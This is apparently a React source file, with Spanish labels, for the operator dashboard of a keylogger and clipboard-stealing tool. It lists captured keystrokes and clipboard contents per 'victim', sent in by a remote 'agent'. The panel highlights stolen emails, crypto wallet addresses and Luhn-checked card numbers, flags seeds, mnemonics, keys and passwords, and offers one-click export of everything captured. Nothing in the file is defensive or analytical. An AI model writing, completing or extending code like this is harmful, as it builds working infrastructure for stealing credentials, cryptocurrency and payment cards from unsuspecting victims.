'use client';
import { useEffect, useMemo, useRef, useState } from 'react';
import { ClipboardCopy, Copy, Search, ShieldAlert, Delete } from 'lucide-react';
import { useApi } from '@/hooks/useApi';
import { useLiveContext } from '@/components/live-provider';
import type { TimelineEntry } from '@/lib/types';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Empty, ErrorState, SkeletonRows } from '@/components/ui/table';
import { dateTime } from '@/lib/format';
import { toast } from 'sonner';

const PATTERN_LABEL: Record<string, string> = {
  email: 'email',
  'wallet-evm': 'EVM',
  'wallet-btc': 'BTC',
  'wallet-base58': 'Base58',
  key: 'clave',
  seed: 'seed',
  mnemonic: 'mnemonic',
  password: 'contraseña',
  card: 'tarjeta'
};

function luhn(digits: string): boolean {
  let sum = 0;
  let double = false;
  for (let index = digits.length - 1; index >= 0; index -= 1) {
    let digit = digits.charCodeAt(index) - 48;
    if (double) { digit *= 2; if (digit > 9) digit -= 9; }
    sum += digit;
    double = !double;
  }
  return sum % 10 === 0;
}

const SENSITIVE = new Set(['seed', 'mnemonic', 'key', 'password', 'card']);

const TOKEN = /(0x[a-fA-F0-9]{40}|bc1[a-z0-9]{20,80}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}|\b(?:\d[ -]?){12,18}\d\b)/gi;

/** Marca los mismos patrones que el relay, sin reparsear el DOM. */
function Highlight({ value, patterns }: { value: string; patterns: string[] }) {
  if (!patterns.length) return <>{value}</>;
  const parts = value.split(new RegExp(`(${TOKEN.source})`, 'gi'));
  return (
    <>
      {parts.map((part, index) => {
        if (!part) return null;
        const hit = patterns.some((pattern) => {
          try {
            if (pattern === 'email') return /^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$/i.test(part);
            if (pattern === 'wallet-evm') return /^0x[a-fA-F0-9]{40}$/.test(part);
            if (pattern === 'wallet-btc') return /^(bc1[a-z0-9]{20,80}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$/.test(part);
            if (pattern === 'card') return /(?:\d[ -]?){12,18}\d/.test(part) && luhn(part.replace(/\D/g, ''));
          } catch { /* ignore */ }
          return false;
        });
        return hit ? <mark key={index} className="rounded bg-warn/30 px-0.5 text-ink">{part}</mark> : part;
      })}
    </>
  );
}

export function TimelinePanel({ victimId, limit = 120 }: { victimId: string; limit?: number }) {
  const live = useLiveContext();
  const [search, setSearch] = useState('');
  const [query, setQuery] = useState('');
  const [type, setType] = useState<'' | 'keystroke' | 'clipboard'>('');
  const [page, setPage] = useState<string | null>(null);
  const [liveItems, setLiveItems] = useState<TimelineEntry[]>([]);
  const lastAt = live.events[0]?.at;
  const timer = useRef<ReturnType<typeof setTimeout> | null>(null);

  useEffect(() => {
    const id = setTimeout(() => { setQuery(search.trim()); setPage(null); }, 300);
    return () => clearTimeout(id);
  }, [search]);

  const params = new URLSearchParams({ limit: String(limit) });
  if (query) params.set('q', query);
  if (type) params.set('type', type);
  if (page) params.set('cursor', page);
  const { data, loading, error, refresh } = useApi<{ items: TimelineEntry[]; next: string | null }>(`/victims/${victimId}/timeline?${params}`, { pollMs: 20_000 });

  useEffect(() => {
    const last = live.events[0];
    if (!last || last.victimId !== victimId) return;
    if (last.type !== 'timeline.new' && !(last.type === 'event.new' && ['keystroke', 'clipboard', 'password', 'clipboard_secret'].includes(String(last.data.kind ?? '')))) return;
    if (timer.current) clearTimeout(timer.current);
    timer.current = setTimeout(() => {
      if (last.type === 'timeline.new') {
        const entry = last.data as unknown as TimelineEntry;
        if (typeof entry?.id === 'string' && typeof entry?.content === 'string') {
          setLiveItems((current) => [entry, ...current.filter((item) => item.id !== entry.id)].slice(0, limit));
        }
      }
      void refresh();
    }, 250);
    return () => { if (timer.current) clearTimeout(timer.current); };
  }, [lastAt]); // eslint-disable-line react-hooks/exhaustive-deps

  const rows = useMemo(() => {
    const merged = [...liveItems, ...(data?.items ?? [])];
    const unique = new Map(merged.map((item) => [item.id, item]));
    return [...unique.values()]
      .filter((item) => !type || item.origin === type)
      .filter((item) => !query || `${item.content} ${item.title} ${item.process}`.toLowerCase().includes(query.toLowerCase()))
      .sort((a, b) => b.ts.localeCompare(a.ts))
      .slice(0, limit);
  }, [liveItems, data, type, query, limit]);

  function copyAll() {
    const text = rows.map((row) => `[${dateTime(row.ts)}] ${row.origin} · ${row.process} · ${row.title}\n${row.content}`).join('\n\n');
    void navigator.clipboard?.writeText(text);
    toast.success(`${rows.length} entradas copiadas`);
  }

  return (
    <div className="space-y-2">
      <div className="flex flex-wrap items-center gap-1">
        <div className="relative min-w-[180px] flex-1">
          <Search className="pointer-events-none absolute left-2 top-1.5 h-3 w-3 text-muted" />
          <input value={search} onChange={(event) => setSearch(event.target.value)} placeholder="buscar contenido, proceso o ventana" className="h-7 w-full rounded border border-line bg-bg pl-7 pr-2 font-mono text-xs" aria-label="Buscar en la línea de tiempo" />
        </div>
        <button className="chip" data-active={type === ''} onClick={() => { setType(''); setPage(null); }}>todo</button>
        <button className="chip" data-active={type === 'keystroke'} onClick={() => { setType('keystroke'); setPage(null); }}>teclas</button>
        <button className="chip" data-active={type === 'clipboard'} onClick={() => { setType('clipboard'); setPage(null); }}>portapapeles</button>
        <Button size="sm" variant="secondary" onClick={copyAll} disabled={rows.length === 0}><ClipboardCopy className="h-3 w-3" /> copiar todo</Button>
      </div>

      {error ? <ErrorState message={error.message} retry={refresh} /> : null}
      {loading && !data ? <SkeletonRows rows={8} cols={3} /> : rows.length === 0 ? (
        <Empty title="Sin actividad todavía" hint="Las pulsaciones y el portapapeles aparecen aquí en cuanto el agente los envía. Requiere agente con timeline." />
      ) : (
        <ol className="divide-y divide-line/60" aria-label="Línea de tiempo">
          {rows.map((row) => (
            <li key={row.id} className="group flex items-start gap-2 px-1 py-1.5" data-origin={row.origin} data-entry-id={row.id}>
              <Badge tone={row.origin === 'clipboard' ? 'brand' : 'default'} title={row.origin === 'clipboard' ? 'portapapeles' : 'teclas'}>{row.origin === 'clipboard' ? <ClipboardCopy className="h-2.5 w-2.5" /> : <Delete className="h-2.5 w-2.5" />}</Badge>
              <div className="min-w-0 flex-1">
                <p className="break-all font-mono text-xs text-ink">
                  <Highlight value={row.content} patterns={row.patterns} />
                  {row.count > 1 ? <span className="ml-1 text-2xs text-muted">×{row.count}</span> : null}
                </p>
                <p className="mt-0.5 flex flex-wrap items-center gap-1 text-2xs text-muted">
                  <span className="num">{dateTime(row.ts)}</span>
                  <span>·</span>
                  <span className="font-mono">{row.process || '—'}</span>
                  <span>·</span>
                  <span className="truncate" title={row.title}>{row.title || '—'}</span>
                  {row.patterns.filter((pattern) => SENSITIVE.has(pattern)).map((pattern) => (
                    <Badge key={pattern} tone="warn"><ShieldAlert className="h-2.5 w-2.5" />{PATTERN_LABEL[pattern] ?? pattern}</Badge>
                  ))}
                  {row.patterns.filter((pattern) => !SENSITIVE.has(pattern)).map((pattern) => (
                    <Badge key={pattern} tone="ok">{PATTERN_LABEL[pattern] ?? pattern}</Badge>
                  ))}
                </p>
              </div>
              <Button size="icon" variant="ghost" aria-label="Copiar entrada" onClick={() => { void navigator.clipboard?.writeText(row.content); toast.success('Entrada copiada'); }}><Copy className="h-3 w-3" /></Button>
            </li>
          ))}
        </ol>
      )}
      {data?.next ? <Button size="sm" variant="ghost" onClick={() => setPage(data.next)}>más antiguos</Button> : null}
    </div>
  );
}
